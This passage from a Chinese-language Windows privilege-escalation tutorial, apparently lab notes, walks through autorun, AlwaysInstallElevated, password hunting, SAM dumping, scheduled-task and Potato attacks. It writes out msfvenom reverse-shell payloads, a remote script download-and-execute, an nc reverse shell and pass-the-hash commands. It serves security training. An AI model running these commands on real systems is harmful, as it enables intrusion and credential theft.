class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol start="6">
<li>开启端口监听，启动服务</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net stop dllsvc</span><br><span class="line">net start dllsvc</span><br></pre></td></tr></table></figure>

<p><img src="/images/windows-privilege-escalation/31.png" alt="31"></p>
<h2 id="Registry"><a href="#Registry" class="headerlink" title="Registry"></a>Registry</h2><h3 id="Autoruns"><a href="#Autoruns" class="headerlink" title="Autoruns"></a>Autoruns</h3><p>windows可以通过开机时候启动的应用进行提权。这些自启动的程序可以在注册表进行设置，如果你能够修改这些AutoRun的可执行程序并且能够重启机器，可能会得到提权</p>
<p>演示</p>
<ol>
<li>winpeas枚举</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">winpeas quiet applicationsinfo</span><br></pre></td></tr></table></figure>

<p><img src="/images/windows-privilege-escalation/32.png" alt="32"></p>
<p>发现了可以修改的Autorun程序，并给出了RegPath</p>
<p>另外，可以使用图形化工具<code>Autoruns</code>，在logon选项卡中找到自启动的程序</p>
<ol start="2">
<li>手动枚举该注册表</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</span><br></pre></td></tr></table></figure>

<p><img src="/images/windows-privilege-escalation/33.png" alt="33"></p>
<ol start="3">
<li>accesschk逐一检查每个执行文件的权限</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.\accesschk.exe&#x2F;accepteula -wvu &quot;C:\Program Files\Autorun Program\program.exe&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/images/windows-privilege-escalation/34.png" alt="34"></p>
<p>检查发现了一个可以修改的可执行程序</p>
<ol start="4">
<li>在真实的渗透中，我们应该备份该文件，接着用我们的reverse_shell的exe文件进行替换</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">copy &quot;C:\Program Files\Autorun Program\program.exe&quot; C:\Temp</span><br><span class="line">copy &#x2F;Y C:\PrivEsc\reverse.exe &quot;C:\Program Files\Autorun Program\program.exe&quot;</span><br></pre></td></tr></table></figure>

<ol start="5">
<li>开启监听，注意这里程序自启动的权限是最后一次的登陆者的权限，这意味着如果上一次登录者为Administrator，我们就可以提权，反之则不能<br>(在实验环境中，退出User的登录，以Administrator登录，并重启)<br>开机后，就可以获得上一次登录的权限，这里为Administrator</li>
</ol>
<p><img src="/images/windows-privilege-escalation/35.png" alt="35"></p>
<h3 id="AlwaysInstallElevated"><a href="#AlwaysInstallElevated" class="headerlink" title="AlwaysInstallElevated"></a>AlwaysInstallElevated</h3><p>.msi格式的安装包被用来安装应用，这些文件会在尝试安装它们的用户权限下运行。<br>windows允许正常用户提升权限(即admin)来安装应用，这种情况我们可以生成制作好的恶意msi文件，该特性类似于linux的SUID</p>
<p><img src="/images/windows-privilege-escalation/59.png" alt="59"></p>
<p>这种提权需要满足两个注册表值的设定<br>在本地计算机和本地用户的注册表中，AlwaysInstallElevated必须设置为1</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer</span><br><span class="line">HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer</span><br></pre></td></tr></table></figure>

<p>如果其中一项没设置，利用就无法完成</p>
<p>演示</p>
<ol>
<li>winpeas枚举</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">winpeas quiet windowscreds</span><br></pre></td></tr></table></figure>

<p><img src="/images/windows-privilege-escalation/36.png" alt="36"></p>
<p>发现两处值都已设为1</p>
<ol start="2">
<li>手动检查注册表</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer &#x2F;v AlwaysInstallElevated</span><br><span class="line">reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer &#x2F;v AlwaysInstallElevated</span><br></pre></td></tr></table></figure>

<p><img src="/images/windows-privilege-escalation/37.png" alt="37"></p>
<ol start="3">
<li>生成一个恶意msi文件</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;x64&#x2F;shell_reverse_tcp LHOST&#x3D;192.168.110.3 LPORT&#x3D;53 -f msi -o reverse.msi</span><br></pre></td></tr></table></figure>

<ol start="4">
<li>传输恶意文件，开启端口监听，运行安装程序触发漏洞利用</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msiexec &#x2F;quiet &#x2F;qn &#x2F;i C:\PrivEsc\reverse.msi</span><br></pre></td></tr></table></figure>

<p><img src="/images/windows-privilege-escalation/38.png" alt="38"></p>
<h2 id="Passwords"><a href="#Passwords" class="headerlink" title="Passwords"></a>Passwords</h2><h3 id="Registry-1"><a href="#Registry-1" class="headerlink" title="Registry"></a>Registry</h3><p>管理员可能会重用某些密码，或者将密码存放在系统的可读位置上，windows容易收到此类攻击，因为windows有多个功能会不安全的存储密码</p>
<p>许多程序会在注册表中存放设置选项，windows本身有时也会在注册表中以明文形式存放密码，所以我们应该尝试在注册表中搜索密码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">reg query HKLM &#x2F;f password &#x2F;t REG_SZ &#x2F;s</span><br><span class="line">reg query HKCU &#x2F;f password &#x2F;t REG_SZ &#x2F;s</span><br></pre></td></tr></table></figure>

<p>第一个搜索本地机器，第二搜索本地用户。这两个命令会有大量输出，因此需要查看更加常用的位置</p>
<p>演示</p>
<ol>
<li>winpeas枚举</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">winpeas.exe quiet filesinfouserinfo</span><br></pre></td></tr></table></figure>

<p><img src="/images/windows-privilege-escalation/39.png" alt="39"></p>
<p><img src="/images/windows-privilege-escalation/40.png" alt="40"></p>
<p>我们发现了Admin用户的AutoLogon credentials和Putty session</p>
<ol start="2">
<li>对两者进行手动枚举</li>
</ol>
<p>AutoLogon credentials</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">reg query &quot;HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/images/windows-privilege-escalation/41.png" alt="41"></p>
<p>Putty session</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">reg query &quot;HKCU\Software\SimonTatham\PuTTY\Sessions&quot; &#x2F;s</span><br></pre></td></tr></table></figure>

<p><img src="/images/windows-privilege-escalation/42.png" alt="42"></p>
<ol start="3">
<li>使用这些凭据，我们可以基于对方的SMB服务进行提权</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">winexe -U &#39;admin%password123&#39; &#x2F;&#x2F;192.168.110.9 cmd.exe</span><br></pre></td></tr></table></figure>

<p><img src="/images/windows-privilege-escalation/43.png" alt="43"></p>
<p>既然这个凭据可以成功提权admin，那么可以使用–system参数，来获取system权限</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">winexe -U &#39;admin%password123&#39; --system &#x2F;&#x2F;192.168.110.9 cmd.exe</span><br></pre></td></tr></table></figure>

<h4 id="PSCredential"><a href="#PSCredential" class="headerlink" title="PSCredential"></a>PSCredential</h4><p>除了PTH，powershell的PSCredential对象也可以存放凭据，存放$cred有两种方法</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$cred&#x3D;$cred&#x3D;Get-Credential</span><br><span class="line">或者</span><br><span class="line">$SecPass &#x3D; ConvertTo-SecureString &#39;password123&#39; -AsPlainText -Force</span><br><span class="line">$cred &#x3D; New-Object System.Management.Automation.PSCredential(&#39;admin&#39;, $SecPass)</span><br></pre></td></tr></table></figure>

<p>其中Get-Credential渗透很难用，需要图形交互。SecureString类可以用来存放密码，这是.net 2.0后引入的类，与Strings类相比</p>
<ul>
<li><p>不再是不可改变的</p>
</li>
<li><p>可被人工销毁</p>
</li>
<li><p>不再会在内存中已明文保存密码，防止被内存提取</p>
</li>
</ul>
<p>因此我们以明文形式输入默认是被禁止的，系统无法保护纯文本输入，所以必须使用参数-Force来强制</p>
<p>之后就可以使用$cred进行提权了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Start-Process -FilePath &quot;powershell&quot; -argumentlist &quot;iex(new-object net.webclient).downloadString(&#39;http:&#x2F;&#x2F;IP&#x2F;winpriv&#x2F;Invoke-PowerShellTcp.ps1&#39;)&quot; -Credential $cred</span><br></pre></td></tr></table></figure>

<p>另外，Invoke-Command和Enter-PSSession可以在开启winrm下启动(没开启会报错连接不上本地)，还需注意指定本地计算机下的用户，否则会默认为域的</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$cred &#x3D; New-Object System.Management.Automation.PSCredential(&#39;computername\\admin&#39;, $SecPass)</span><br><span class="line"></span><br><span class="line">Invoke-Command -ScriptBlock &#123;whoami&#125; -ComputerName localhost -Credential $cred</span><br><span class="line">Enter-PSSession -ComputerName localhost -Credential $cred</span><br></pre></td></tr></table></figure>

<p><strong>补充说明</strong>:凭据会保存很多位置，winpeas会自动检索常用的一些位置</p>
<p>我们可以以password为关键词，手动搜索注册表，检索键名或键值中出现这个词的地方</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">reg query HKLM &#x2F;f password &#x2F;t REG_SZ &#x2F;s</span><br><span class="line">reg query HKCU &#x2F;f password &#x2F;t REG_SZ &#x2F;s</span><br></pre></td></tr></table></figure>

<h3 id="Saved-Creds"><a href="#Saved-Creds" class="headerlink" title="Saved Creds"></a>Saved Creds</h3><p>Windows中有一个Runas命令，它允许用户使用其他用户的权限运行命令。这通常需要知道其他用户的密码。<br>但是，Windows还允许用户将凭据保存到系统中，我们可以发现这些保存的凭据，并使用它们绕过</p>
<p>演示</p>
<ol>
<li>winpeas枚举</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">winpeas.exe quiet cmd windowscreds</span><br></pre></td></tr></table></figure>

<p><img src="/images/windows-privilege-escalation/44.png" alt="44"></p>
<p>发现了管理用户保存的凭据</p>
<ol start="2">
<li>手动枚举</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cmdkey &#x2F;list</span><br></pre></td></tr></table></figure>

<p><img src="/images/windows-privilege-escalation/45.png" alt="45"></p>
<ol start="3">
<li>我们可以使用保存的凭据以管理员身份运行任何文件，这里我们在kali开启监听，运行reverse_shell</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">runas &#x2F;savecred &#x2F;user:admin C:\PrivEsc\reverse.exe</span><br></pre></td></tr></table></figure>

<p><img src="/images/windows-privilege-escalation/46.png" alt="46"></p>
<h3 id="Configuration-Files"><a href="#Configuration-Files" class="headerlink" title="Configuration Files"></a>Configuration Files</h3><p>一些管理员会将密码保存在某些配置文件上，比如Unattend.xml，它允许windows进行自动化设置，所以上面基本可以确认存有密码</p>
<p>比如一些明显的程序如VNC，putty等</p>
<h4 id="寻找配置文件"><a href="#寻找配置文件" class="headerlink" title="寻找配置文件"></a>寻找配置文件</h4><p>在当前目录递归搜索，以pass或.config为结尾的文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dir &#x2F;s *pass* &#x3D;&#x3D; *.config</span><br></pre></td></tr></table></figure>

<p>在当前目录递归搜索，包含单词password，并且以.xml,.ini或.txt为结尾的文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">findstr &#x2F;si password *.xml *.ini *.txt</span><br></pre></td></tr></table></figure>

<p>演示</p>
<ol>
<li>winpeas枚举</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">winpeas quiet cmd searchfast filesinfo</span><br></pre></td></tr></table></figure>

<p>关注<code>Searching known files that can contain creds</code> 条目下输出的文件</p>
<ol start="2">
<li>手动进行检查即可，看是否存有凭据</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">type FILE_LOCATION</span><br></pre></td></tr></table></figure>

<p>metasploit模块</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">windows&#x2F;gather&#x2F;enum_unattend</span><br></pre></td></tr></table></figure>

<p>该模块主要检查以下位置</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\sysprep.inf</span><br><span class="line">C:\sysprep\sysprep.xml</span><br><span class="line">C:\Windows\system32\sysprep.inf</span><br><span class="line">C:\Windows\system32\sysprep\sysprep.xml</span><br><span class="line">C:\unattend.xml</span><br><span class="line">C:\Windows\Panther\Unattend.xml</span><br><span class="line">C:\Windows\Panther\Unattended.xml</span><br><span class="line">C:\Windows\Panther\Unattend\Unattended.xml</span><br><span class="line">C:\Windows\Panther\Unattend\Unattend.xml</span><br><span class="line">C:\Windows\system32\sysprep\Unattend.xml</span><br><span class="line">C:\Windows\system32\sysprep\Panther\Unattend.xml</span><br></pre></td></tr></table></figure>

<h3 id="SAM"><a href="#SAM" class="headerlink" title="SAM"></a>SAM</h3><p>Windows将密码的哈希存放在SAM中。这些哈希使用密钥加密，可以在SYSTEM文件中找到密钥。<br>如果可以读取SAM和SYSTEM文件，则可以提取哈希</p>
<p>SAM和SYSTEM文件存放在<code>C:\Windows\System32\config</code>目录下。这两个文件会在windows运行时锁定。<br>存心的管理员会把它备份存储在一些位置如<code>C:\Windows\Repair</code>或<code>C:\Windows\System32\config\RegBack</code></p>
<p>演示(假设发现了备份文件)</p>
<ol>
<li><p>将SAM和SYSTEM文件传输到Kali中</p>
</li>
<li><p>下载pwdump<a href="https://github.com/Neohapsis/creddump7">https://github.com/Neohapsis/creddump7</a><br>获取LM和NTLM哈希</p>
</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python2 creddump7&#x2F;pwdump.pySYSTEM SAM</span><br></pre></td></tr></table></figure>

<p>可以尝试破解，也可以尝试哈希传递攻击</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pth-winexe --system -U &#39;admin%aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da&#39; &#x2F;&#x2F;192.168.110.9 cmd.exe</span><br></pre></td></tr></table></figure>

<p><img src="/images/windows-privilege-escalation/47.png" alt="47"></p>
<h2 id="Scheduled-Tasks"><a href="#Scheduled-Tasks" class="headerlink" title="Scheduled Tasks"></a>Scheduled Tasks</h2><p>windows可以设置计划任务在一个特定时间执行(比如每5分钟)或者在某些事件触发时执行(比如用户登录)。<br>计划任务的运行权限通常是创建它们的用户权限，但是管理员可以将它们设置为以其他身份运行，包括SYSTEM用户</p>
<p>不幸的是，没有一种简单的方法可以在一个低权限的用户下枚举其他用户计划任务的方法</p>
<p>你可以枚举所有计划任务</p>
<p>CMD</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">schtasks &#x2F;query &#x2F;fo LIST &#x2F;v</span><br></pre></td></tr></table></figure>

<p>Powershell</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Get-ScheduledTask | where &#123;$_.TaskPath -notlike &quot;\Microsoft*&quot;&#125; | ft TaskName,TaskPath,State</span><br></pre></td></tr></table></figure>

<p>通常，我们需要依赖其他线索， 比如计划任务的执行脚本或日志文件</p>
<p>另外图形化工具Autoruns的ScheduledTasks也可以进行枚举</p>
<p>演示</p>
<ol>
<li>假设发现了一个计划任务脚本，查看它的源码</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\DevTools\CleanUp.ps1</span><br></pre></td></tr></table></figure>

<p><img src="/images/windows-privilege-escalation/48.png" alt="48"></p>
<p>从中发现它运行在SYSTEM权限下</p>
<ol start="2">
<li>检查文件权限</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.\accesschk.exe &#x2F;accepteula -quvw user &quot;C:\DevTools\CleanUp.ps1&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/images/windows-privilege-escalation/49.png" alt="49"></p>
<p>发现具有文件写入权限</p>
<ol start="3">
<li>真实渗透中，备份该文件</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">copy C:\DevTools\CleanUp.ps1 C:\Temp\</span><br></pre></td></tr></table></figure>

<ol start="4">
<li><p>kali开启监听</p>
</li>
<li><p>使用echo命令，调用reverse.exe的语句追加到该脚本中</p>
</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo C:\PrivEsc\reverse.exe &gt;&gt; C:\DevTools\CleanUp.ps1</span><br></pre></td></tr></table></figure>

<p><img src="/images/windows-privilege-escalation/50.png" alt="50"></p>
<ol start="6">
<li>耐心等待计划任务执行，就可以获得reverse_shell了</li>
</ol>
<p><img src="/images/windows-privilege-escalation/51.png" alt="51"></p>
<h2 id="Insecure-GUI-Apps-Citrix-Method"><a href="#Insecure-GUI-Apps-Citrix-Method" class="headerlink" title="Insecure GUI Apps (Citrix Method)"></a>Insecure GUI Apps (Citrix Method)</h2><p>在某些(旧)版本的windows中，用户可以被授予权限，可以以管理员身份运行某些GUI程序<br>我们有很多种方法可以在GUI中生成命令提示符，包括使用windows本身的功能。<br>由于GUI父进程以管理员权限运行，因此生成的命令提示符也会以管理员权限运行。这称为<code>Citrix Method</code>，因为它使用了许多与Citrix环境相同的技术</p>
<p>演示</p>
<ol>
<li>以user权限GUI登录到windows中</li>
<li>在桌面发现了名为AdminPaint的快捷方式，运行它</li>
</ol>
<p><img src="/images/windows-privilege-escalation/52.png" alt="52"></p>
<ol start="3">
<li>枚举该进程的运行权限</li>
</ol>
<p><img src="/images/windows-privilege-escalation/53.png" alt="53"></p>
<p>发现其运行在admin权限下</p>
<ol start="4">
<li>点击左上角FIle→Open→打开文件输入file://c:/windows/system32/cmd.exe，接着不要点击Open，直接敲击回车</li>
</ol>
<p><img src="/images/windows-privilege-escalation/54.png" alt="54"></p>
<ol start="5">
<li>生成高权限shell</li>
</ol>
<p><img src="/images/windows-privilege-escalation/55.png" alt="55"></p>
<h2 id="Startup-Apps"><a href="#Startup-Apps" class="headerlink" title="Startup Apps"></a>Startup Apps</h2><p>每个用户都可以通过将快捷方式放置在特定目录中定义在登录时启动的应用程序<br>Windows提供了启动目录来存放启动程序，并会在任何用户登录时启动</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp</span><br></pre></td></tr></table></figure>

<p>当然，肯定和单用户的启动目录无关</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</span><br></pre></td></tr></table></figure>

<p>如果我们可以在此目录中创建文件，则可以在管理员登录时加载reverse_shell可执行文件，来进行提权</p>
<p>注意，必须使用快捷方式文件(.lnk)。我们将使用一个VBScript来创建快捷方式文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Set oWS &#x3D; WScript.CreateObject(&quot;WScript.Shell&quot;)</span><br><span class="line">sLinkFile &#x3D; &quot;C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\reverse.lnk&quot;</span><br><span class="line">Set oLink &#x3D; oWS.CreateShortcut(sLinkFile)</span><br><span class="line">oLink.TargetPath &#x3D; &quot;C:\PrivEsc\reverse.exe&quot;</span><br><span class="line">oLink.Save</span><br></pre></td></tr></table></figure>

<p>演示</p>
<p>accesschk检查StartUp目录当前用户权限</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.\accesschk.exe &#x2F;accepteula -d &quot;C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/images/windows-privilege-escalation/56.png" alt="56"></p>
<p>我们发现它允许BUILTIN\Users进行RW权限，即我们用户所在组</p>
<p>创建刚刚VBScript脚本文件，并执行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cscript CreateShortcut.vbs</span><br></pre></td></tr></table></figure>

<p><img src="/images/windows-privilege-escalation/57.png" alt="57"></p>
<p>kali开启监听，当admin账户登录到该机器时，我们可以获得提权</p>
<p><img src="/images/windows-privilege-escalation/58.png" alt="58"></p>
<h2 id="Installed-Applications"><a href="#Installed-Applications" class="headerlink" title="Installed Applications"></a>Installed Applications</h2><p>第三方安装应用的提权方式，大多数会基于前面已经介绍过的漏洞进行提权。不过仍然会有如缓冲区溢出等原因导致的某些权限提升，因此我们需要准确枚举出已安装的第三方应用以及寻找公开漏洞</p>
<p>枚举当前运行的应用程序</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tasklist &#x2F;v</span><br></pre></td></tr></table></figure>

<p>使用seabelt来枚举非标准程序</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.\seatbelt.exe NonstandardProcesses</span><br></pre></td></tr></table></figure>

<p>winpeas枚举(注意它这里prcesinfo就用拼错的)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.\winpeas.exe quiet procesinfo</span><br></pre></td></tr></table></figure>

<p>检查上面工具的所有输出，一旦找到有趣的进程后，尝试确认它的版本。你可以尝试执行它的可执行文件，并使用<code>/?</code>或<code>-h</code>，同时检查该程序所在目录的一些配置文件。接着寻找公开漏洞利用，编译并运行利用程序</p>
<h2 id="土豆家族"><a href="#土豆家族" class="headerlink" title="土豆家族"></a>土豆家族</h2><p>土豆家族的攻击原理非常有趣，以后再写更详细的攻击原理</p>
<h3 id="Hot-Potato"><a href="#Hot-Potato" class="headerlink" title="Hot Potato"></a>Hot Potato</h3><p>Hot Patato是一个攻击工具，简单来说它通过进行NTLM重放攻击完成欺骗攻击，可以获得SYSTEM权限。该攻击诱使Windows使用NTLM用户身份验证到伪造的HTTP服务器，接着将NTLM凭据重放到SMB，从而达到命令执行。这种攻击适用于windows7、8和部分早期版本的windows10</p>
<p>针对不同版本的windows会有不同的参数，这里演示的是win7</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.\potato.exe -ip 192.168.1.33 -cmd &quot;C:\Users\test7sp1\Desktop\reverse.exe&quot; -enable_httpserver true -enable_defender true -enable_spoof true -enable_exhaust true</span><br><span class="line">ip     本机的ip</span><br><span class="line">cmd    想执行的命令</span><br></pre></td></tr></table></figure>

<p>另外有一个明文Tater.ps1是HotPotato通过powershell的实现，也具有同样效果</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Invoke-Tater -Trigger 1 -Command &quot;C:\Users\user\Desktop\nc.exe 192.168.110.2 5555 -e cmd&quot;</span><br></pre></td></tr></table></figure>

<h3 id="Service-Accounts-Rotten-Juicy-Potato"><a href="#Service-Accounts-Rotten-Juicy-Potato" class="headerlink" title="Service Accounts (Rotten / Juicy Potato)"></a>Service Accounts (Rotten / Juicy Potato)</h3><p>回顾一下服务账号的特性，对于其账号关联的服务有特殊的权限，不可以直接登录。服务账号可以用来进行提权</p>
<p>2016年发现了Rotten Potato进行提权，服务账户可以盗取SYSTEM的票据并假冒SYSTEM用户，这个利用需要开启SeImpersonatePrivilege</p>
<p>之后的Juicy Potato是Rotten Potato的升级版，运作原理相同，但提供了更多的利用方式</p>
<p><strong>记住</strong>，这种攻击的对象是服务账户</p>
<p>演示，这里还是windows7环境</p>
<p>我们先要获取一个服务账户的shell，在kali中开启监听，以admin身份登录windows7，使用psexec切换账户，并运行反弹shell</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\PrivEsc\PSExec64.exe -i -u &quot;ntauthority\local service&quot; C:\PrivEsc\reverse.exe</span><br></pre></td></tr></table></figure>

<p>现在我们就获得了服务账户的shell</p>
<ol>
<li>手动枚举权限</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\Windows\system32&gt;whoami &#x2F;priv</span><br><span class="line">SeImpersonatePrivilege		Enabled</span><br></pre></td></tr></table></figure>

<p>确认SeImpersonatePrivilege为开启</p>
<ol start="2">
<li>kali开启监听，使用juicy potato</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\PrivEsc\JuicyPotato.exe -l 1337 -p C:\PrivEsc\reverse.exe -t * -c &#123;03ca98d6-ff5d-49b8-abc6-03dd84127020&#125;</span><br><span class="line">-l		指定端口，必须不能被使用</span><br><span class="line">-p		指定命令</span><br><span class="line">-c		指定一个该windows中存在的clsid</span><br></pre></td></tr></table></figure>

<p>这样就能获取SYSTEM权限的shell</p>
<h3 id="Juicypotato和roguepotato的区别"><a href="#Juicypotato和roguepotato的区别" class="headerlink" title="Juicypotato和roguepotato的区别"></a>Juicypotato和roguepotato的区别</h3><p>有一些不错的文章已经很好的讲述两个提权的工作原理:，<a href="https://iv4n.cc/potato-family-local-priv-elevate/">roguepotato链接</a></p>
<p>需要记住juicypotato在低版本windows上有用，roguepotato在高版本上有用，除此以外需要记住网络连接上的差异</p>
<p>juicypotato<br>运行程序→RPC到指定端口(如9999)这里会窃取token</p>
<p>微软如何修复<br>将RPC端口硬编码为135端口</p>
<p>roguepotato<br>运行程序→RPC到攻击者控制的135端口→攻击者转发流量到目标端口(如9999,该端口会运行rogueOxidResolver)<br>所以攻击中的主要问题是，目标防火墙阻断链接(比如9999端口)，幸运的是隧道和端口准发结合使用可以完成这一目的，只需要</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">受害者和攻击者建立隧道，让攻击者9999端口的流量准发到受害者本地的9999端口</span><br><span class="line">攻击者将自己135端口转发到另一本地端口，如9999</span><br></pre></td></tr></table></figure>

<h2 id="Port-Forwarding"><a href="#Port-Forwarding" class="headerlink" title="Port Forwarding"></a>Port Forwarding</h2><p>有时候易受攻击的端口只在内部监听，在这种情况下，我们需要使用远程端口转发，可以使用plink</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cmd &#x2F;c &quot;echo y|C:\Windows\Temp\plink64.exe -l root -pw toor -R &lt;kali-port&gt;:&lt;target-IP&gt;:&lt;target-port&gt;&quot;</span><br></pre></td></tr></table></figure>

<p>通常target-IP输入的是127.0.0.1</p>
<h1 id="额外部分"><a href="#额外部分" class="headerlink" title="额外部分"></a>额外部分</h1><h3 id="Meterpreter-gt-getsystem"><a href="#Meterpreter-gt-getsystem" class="headerlink" title="Meterpreter&gt;getsystem"></a>Meterpreter&gt;getsystem</h3><p>首先介绍几个概念</p>
<p><strong>Access Tokens</strong></p>
<p>访问令牌是windows中的特殊对象，它用来存储用户的身份和权限。有两种Access Tokens<br>PrimaryAccess Token:用户登录时创建，并绑定到当前用户会话。当用户启动一个新的程序，这个访问令牌会被复制并被新的程序所加载。这就表示这个程序会运行在这个用户Token所在的权限<br>ImpersonationAccess Token:在进程或线程需要安全的使用其他用户的上下文运行时，被临时创建</p>
<p>windows允许进程或线程复制访问令牌，所以ImpersonationAccess Token可以被复制成PrimaryAccess Token<br>如果我们可以注入一个进程，我们可以使用此功能来复制该进程的令牌，然后使用此令牌来产生另一个相同权权限的单独进程</p>
<p><strong>Named Pipes</strong></p>
<p>pipe管道技术在windows和linux中经常使用，比如</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">systeminfo | findstrWindows</span><br></pre></td></tr></table></figure>

<p>命名管道是这种技术的扩展<br>一个进程可以创建一个命名管道，其他进程可以打开管道从中读取或写入数据<br>创建命名管道的进程可模拟连接到命名管道的安全上下文</p>
<p>接着我们开始分析meterpreter的getsystem命令具体是怎么实现的<br>首先它的源码:<a href="https://github.com/rapid7/metasploit-payloads/tree/d672097e9989e0b4caecfad08ca9debc8e50bb0c/c/meterpreter/source/extensions/priv">链接</a><br>最值得关注的是elevate.c, namedpipe.c, tokendup.c。它们使用了3种不同得技术获取system</p>
<p><strong>Named Pipe Impersonation (In Memory/Admin)</strong><br>创建由meterpreter控制的命名管道<br>创建一个服务(以SYSTEM身份运行)，该服务的命令直接与命名管道交互<br>接着，meterpreter模拟连接进程去获取ImpersonationAccess Token(这里就是SYSTEM的安全上下文)<br>最后，将令牌分配给后续的meterpreter程序，这意味着它们会以SYSTEM身份运行</p>
<p><strong>Named Pipe Impersonation (Dropper/Admin)</strong><br>与上一种方法非常类似。唯一的不同是写了一个DLL在磁盘中，创建的服务加载DLL以SYSTEM身份运行。DLL连接到命名管道</p>
<p><strong>Token Duplication (In Memory/Admin)</strong><br>这个技术需要SeDebugPrivilege。它寻找任何以SYSTEM身份运行的服务，并进行DLL注入<br>DLL会复制访问令牌会将其分配给meterpreter。目前，这种技术只适用于x86架构<br>这种唯一不需要创建服务完全在内存中运行的技术</p>
<p>Meterpreter的getsystem功能本身是将本地管理员升级到SYSTEM的一个工具<br>命名管道技术需要本地管理员权限<br>复制令牌技术需要SeDebugPrivilege权限，并且只适用于x86架构</p>
<p>所以getsystem功能不是让你在<strong>现代操作系统</strong>中从User权限提升到Admin权限</p>
<h3 id="User-Privileges"><a href="#User-Privileges" class="headerlink" title="User Privileges"></a>User Privileges</h3><p>在windows中可以为账户和组分配一些特别的权限。这些权限可以让你拥有一些功能的访问权限。其中一些功能有助于获取SYSTEM权限</p>
<p>使用该命令检查，而且需要特别注意，在这里<code>disabled</code>无关紧要。这里只有列了出来，那么你就拥有该权限</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">whoami &#x2F;priv</span><br></pre></td></tr></table></figure>

<p><strong>SeImpersonatePrivilege</strong></p>
<p>可以获得任何程序的access token，如果从SYSTEM中盗取了令牌，则可以使用它生成一个新的进程。<br>juicy potato可以使用它</p>
<p><strong>SeAssignPrimaryPrivilege</strong></p>
<p>与SeImpersonatePrivilege类似，使用户能够将访问令牌分配给新进程<br>juicy potato可以使用它</p>
<p><strong>SeBackupPrivilege</strong></p>
